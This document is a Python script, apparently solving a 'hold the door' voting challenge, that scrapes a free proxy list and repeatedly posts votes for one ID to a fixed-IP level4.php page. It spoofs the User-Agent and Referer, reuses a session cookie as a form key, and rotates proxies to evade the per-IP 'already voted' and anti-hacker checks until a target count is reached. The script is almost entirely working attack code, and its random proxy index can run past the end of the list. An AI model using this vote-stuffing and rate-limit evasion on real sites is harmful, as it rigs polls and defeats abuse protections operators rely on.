#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
from random import *

datos = {'id': '771', 'holdthedoor': 'Submit+Query'}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0)'
    ' Gecko/20100101 Firefox/60.0',
    'Referer': 'http://158.69.76.135/level4.php'
    }
URL = 'http://158.69.76.135/level4.php'
id = "\n" + str(datos['id']) + "    "
err_1 = "b'Wrong Referer. See you later hacker! [7]'"
err_2 = "b'See you later hacker! [6]'"
err_3 = "b'You already voted today [12]'"
err_4 = "b'See you later hacker! [4]'"
page = requests.get(URL, headers=headers)


def get_vote():
    html = BeautifulSoup(page.text, 'html.parser')
    try:
        td = html.find("td", string=id)
        td = str(td.find_next())
        td_1 = ""
        for x in td[5:-5]:
            if ord(x) != 32:
                td_1 += x
        int(td_1)
    except:
        td_1 = "0"
        int(td_1)
    return (td_1)


def get_proxies(url):
    proxies = requests.get(url)
    html = BeautifulSoup(proxies.text, 'html.parser')
    lista = html.find('tbody')
    td = lista.find_all('td')
    ip_https = []
    ip_http = []
    for x in range(len(td)):
        if str(td[x])[7] == '.' or str(td[x])[6] == '.':
            ip_https.append(
                    "https://" +
                    (str(td[x])[4:-5]) +
                    ':' +
                    (str(td[x + 1])[4:-5])
                    )
            ip_http.append( 
                    "http://" +
                    (str(td[x])[4:-5]) +
                    ':' +
                    (str(td[x + 1])[4:-5])
                    )
    return (ip_http, ip_https)


prox_http, prox_https = get_proxies('https://free-proxy-list.net/')

min = int(get_vote())
while min < 98:
    i = randint(0, len(prox_https))
    proxies = {
            'https': str(prox_https[i]),
            'http': str(prox_http[i])
            }
    print(proxies)
    page = requests.get(URL, headers=headers, proxies=proxies)
    datos['key'] = page.cookies['HoldTheDoor']
    r = requests.post(
            URL,
            headers=headers,
            proxies=proxies,
            data=datos,
            cookies=page.cookies
            )
    e = str(r.content)
    if e != err_1 and e != err_2 and e != err_3 and e != err_4:
        min += 1
        print(min)
    else:
        print(r.content)
